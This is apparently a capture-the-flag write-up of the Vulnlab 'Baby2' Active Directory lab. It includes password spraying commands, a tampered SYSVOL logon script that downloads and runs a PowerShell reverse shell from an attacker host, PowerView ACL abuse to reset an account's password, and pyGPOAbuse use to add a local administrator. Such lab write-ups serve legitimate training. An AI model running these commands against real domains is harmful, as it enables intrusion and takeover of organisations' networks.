+++
date = '2026-07-07T18:15:51+02:00'
draft = false
title = 'BabyTwo Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`09/06/2026`**

![BabyTwo.png](/images/imgs_babytwo/BabyTwo.png)

---
# Introduction

**_Baby2_** is a **Medium-level Active Directory** environment from **Vulnlab**. It builds upon **AD** fundamentals, introducing complex attack paths involving shared resources and **Group Policy Object** (**GPO**) exploitation.

The initial foothold involves anonymous SMB enumeration to extract a user list, followed by a username=password spraying attack. Finding valid credentials for a user with write permissions over the SYSVOL share, I modified a logon script (login.vbs) to execute a reverse shell, which was triggered by another user logging in.
For privilege escalation, BloodHound revealed a WriteDacl privilege over the GPOADM account, which I abused to reset its password. Finally, leveraging GPOADM's GenericAll rights over a GPO, I injected a malicious policy to add a new local administrator, fully compromising the machine.

---
# Techniques Used
- **SMB Anonymous Enumeration**

- **Password Spraying (Username as Password)**

- **SYSVOL Logon Script Manipulation (VBS)**

- **BloodHound Harvesting & Enumeration**

- **DACL Abuse (WriteDacl) via PowerView**

- **GPO Abuse via pygpoabuse**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- -Pn baby2
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49673/tcp open  unknown
49677/tcp open  unknown
58230/tcp open  unknown
58237/tcp open  unknown
61726/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV -Pn baby2
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-07 13:04:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-07T13:05:30+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-07-06T13:02:09
|_Not valid after:  2027-01-05T13:02:09
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-07T13:04:50+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-07T13:04:54
|_  start_date: N/A
```

**Open Ports**:

- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **3389**/tcp - RDP

I added **`baby2.vl`** and **`dc.baby2.vl`** to my **`/etc/hosts`**.

## SMB Enumeration & Information Gathering

I started by enumerating the **SMB** shares, checking if the **Guest** or **anonymous** login was allowed using **NetExec**:

```bash
nxc smb baby2.vl -u 'Guest' -p '' --shares
```

![smbanon.png](/images/imgs_babytwo/smbanon.png)

The output showed access to a couple of interesting non-default shares: **`apps`** and **`homes`**.
I connected to the **`apps`** share using **smbclient**:

```bash
smbclient //baby2.vl/apps -U 'Guest'
```

![smbclient.png](/images/imgs_babytwo/smbclient.png)

Navigating through the **`dev`** folder, I found a **`CHANGELOG`** file and a shortcut named **`login.vbs.lnk`**. I downloaded everything to my local machine. 

![changelog.png](/images/imgs_babytwo/changelog.png)

Extracting **`strings`** from the **`.lnk`** file confirmed the existence of a **Visual Basic** logon script inside **SYSVOL** share.

![loginvbs.png](/images/imgs_babytwo/loginvbs.png)

Next, I accessed the **`homes`** share:

```bash
smbclient //baby2.vl/homes -U 'Guest'
```

This share contained a directory for every user in the domain.

![users.png](/images/imgs_babytwo/users.png)

I copied the output and used **bash** to parse the usernames into a clean wordlist:

```bash
cat users.txt | cut -d " " -f3 | tee users_cleaned.txt
```

![userscleaned.png](/images/imgs_babytwo/userscleaned.png)

---
# Initial Access | Logon Script Manipulation → VBS Reverse Shell

With a valid list of users, I performed a **password spraying** attack. 

**Note**: _A very common (and poor) practice in initial **AD** setups is users having their password set exactly to their username._

```bash
nxc smb baby2.vl -u users_cleaned.txt -p users_cleaned.txt --continue-on-success
```

![continueonsuccess.png](/images/imgs_babytwo/continueonsuccess.png)

The spray successfully returned a hit: 

```text
Carl.Moore:Carl.Moore
```

I validated these credentials against the **SYSVOL** share, which holds the domain's logon scripts and group policies:

```bash
nxc smb baby2.vl -u 'Carl.Moore' -p 'Carl.Moore'

smbclient //10.10.122.180/SYSVOL -U 'baby2.vl/Carl.Moore%Carl.Moore'
```

![smbcarl.png](/images/imgs_babytwo/smbcarl.png)

![smbsysvol.png](/images/imgs_babytwo/smbsysvol.png)

Navigating to the **`/baby2.vl/scripts`** directory, I found the actual **`login.vbs`** file and downloaded it. Crucially, my current user (**Carl.Moore**) had write permissions in this directory.

- **`login.vbs`**:

![catloginvbs.png](/images/imgs_babytwo/catloginvbs.png)

**Note**: _Modifying a logon script inside **SYSVOL** is a classic **Red Team** persistence and lateral movement technique. When any user in the domain logs in, the **KDC** instructs their machine to fetch and execute this script. By replacing it with a malicious payload, we can hijack the session of the next user who authenticates._

I prepared a **Nishang PowerShell** reverse shell payload (**`Invoke-PowerShellTcp.ps1`**) and appended the execution call at the bottom of the file:

```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 22667" >> Invoke-PowerShellTcp.ps1

mv Invoke-PowerShellTcp.ps1 stars.ps1
```

I didn't know the exact **VBScript** syntax to execute external commands off the top of my head, so I did a quick **Google** search for "**vbs revshell**". I grabbed the **`CreateObject("WScript.Shell").Run`** method and modified the **`login.vbs`** file to fetch and execute my **PowerShell** script entirely in memory:

```VBScript
CreateObject("WScript.Shell").Run "powershell -ep bypass -w hidden IEX(New-Object System.Net.Webclient).DownloadString('http://<ATTACKER_IP>:8000/stars.ps1')"
```

I hosted the **PowerShell** payload on a local **HTTP** server (**`python3 -m http.server`**), started a **Netcat** listener on port 22667, and uploaded the malicious **`login.vbs`** back to **SYSVOL**:

```bash
smbclient //baby2.vl/SYSVOL -U 'Carl.Moore'
cd /baby2.vl/scripts
del login.vbs
put login.vbs
```

After a short wait, a user logged in, triggered the script, and I caught a shell as **`amelia.griffiths`**.

![initialaccess.png](/images/imgs_babytwo/initialaccess.png)

I navigated to **`C:\Users\amelia.griffiths\Desktop`** and retrieved the **user flag**.

![userflag.png](/images/imgs_babytwo/userflag.png)

---
# Privilege Escalation | WriteDacl → GPO Abuse

Now operating as **`amelia.griffiths`**, I started my internal **Active Directory** enumeration using **BloodHound**:

```bash
bloodhound-python -u 'Carl.Moore' -p 'Carl.Moore' -ns 10.129.234.72 -d baby2.vl -c all --zip
```

![harvesting.png](/images/imgs_babytwo/harvesting.png)

![ingest.png](/images/imgs_babytwo/ingest.png)

After importing the zip file into the **BloodHound GUI**, I set **`AMELIA.GRIFFITHS`** as the starting node. Reviewing the **Outbound Object Control**, I discovered that this user (or her group, **legacy**) had **`WriteDacl`** permissions over the **GPOADM** account.

![hound1.png](/images/imgs_babytwo/hound1.png)

**Note**: _Having **`WriteDacl`** means the attacker can modify the permissions (**Access Control List**) of the target object. This allows us to grant ourselves **`GenericAll`** (**Full Control**), which intrinsically includes the right to reset the target's password without knowing the old one._

To exploit this, I downloaded **PowerView** to the target machine and imported the module:

```bash
iwr -uri http://<ATTACKER_IP>:8000/PowerView.ps1 -Outfile PowerView.ps1
```

![pvdownload.png](/images/imgs_babytwo/pvdownload.png)

Using **PowerView**, I granted my principal (**legacy**) full rights over **GPOADM** and then reset its password:

```powershell
import-module ./PowerView.ps1

Add-DomainObjectAcl -TargetIdentity "GPOADM" -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose

$UserPassword = ConvertTo-SecureString 'fall123!' -AsPlainText -Force

Set-DomainUserPassword -Identity "GPOADM" -AccountPassword $UserPassword
```

![writedacl.png](/images/imgs_babytwo/writedacl.png)

## Malicious GPO Injection

Checking **BloodHound** again, I looked at what privileges **GPOADM** had. The account had **`GenericAll`** rights over a specific **Group Policy Object** (**GPO**).

![hound2.png](/images/imgs_babytwo/hound2.png)

**Note**: _With **`GenericAll`** over a **GPO**, an attacker can modify the policy to execute arbitrary commands, create scheduled tasks, or add local users on all machines where the policy is applied (usually **Domain Controllers** or entire **OUs**)._

To weaponize this, I used **pygpoabuse**, an external **Python** tool designed specifically for this vector.

![gpoabusehint.png](/images/imgs_babytwo/gpoabusehint.png)

I cloned the repo:

- https://github.com/Hackndo/pyGPOAbuse

Set up a virtual environment and launched the exploit:

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git && cd pyGPOAbuse

python3 -m venv venv && . venv/bin/activate

pip3 install -r requirements.txt

python3 pygpoabuse.py 'baby2.vl/gpoadm:fall123!' -gpo-id '<GPO_ID>' -f
```

![gpoid.png](/images/imgs_babytwo/gpoid.png)

The script successfully injected a task into the **GPO** that creates a new local **administrator** named **john** with the password **H4x00r123..**

![pygpoabuse.png](/images/imgs_babytwo/pygpoabuse.png)

I initially tried to validate the new credentials via **NetExec**, but the authentication failed.

**Note**: _**Group Policies** do not apply instantly across the domain. By default, they refresh in the background every 90 minutes (with a randomized offset). The newly created account won't actually exist on the target machine until it pulls the updated policy._

```bash
nxc winrm 10.10.122.180 -u 'john' -p 'H4x00r123..'
```

So, from my existing **`amelia.griffiths`** shell, I manually forced a group policy update:

```powershell
gpupdate /force
```

Once the policy update completed, the **john** account was successfully provisioned. 

```bash
nxc winrm 10.10.122.180 -u 'john' -p 'H4x00r123..'
```

![pwned.png](/images/imgs_babytwo/pwned.png)

I then connected as the newly created highly privileged user via **Evil-WinRM**:

```bash
evil-winrm -i baby2.vl -u 'john' -p 'H4x00r123..'
```

_**System Compromised**._ 

I navigated to the **Administrator**'s desktop to grab the **root flag**.

![rootflag.png](/images/imgs_babytwo/rootflag.png)

---
# Final Thoughts

**_Baby2_** is an absolutely brilliant **Active Directory** lab that perfectly bridges the gap between basic enumeration and advanced domain exploitation.

The initial access phase is highly realistic: poor password policies combined with overly permissive write access to **SYSVOL** is a lethal combination often found in internal corporate networks.

The privilege escalation path forces you to understand the inner workings of **Active Directory Access Control Lists**. Transitioning from a **`WriteDacl`** abuse to a **GPO** abuse makes this box good for practicing the methodologies required for certifications like the **OSCP** and **CRTP**.

**Sources**:

- **Nishang Reverse Shells | https://github.com/samratashok/nishang**

- **PowerView (PowerSploit) | https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon**

- **pygpoabuse | https://github.com/Hackndo/pygpoabuse**

- **Abusing GPOs (Hackndo) | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse**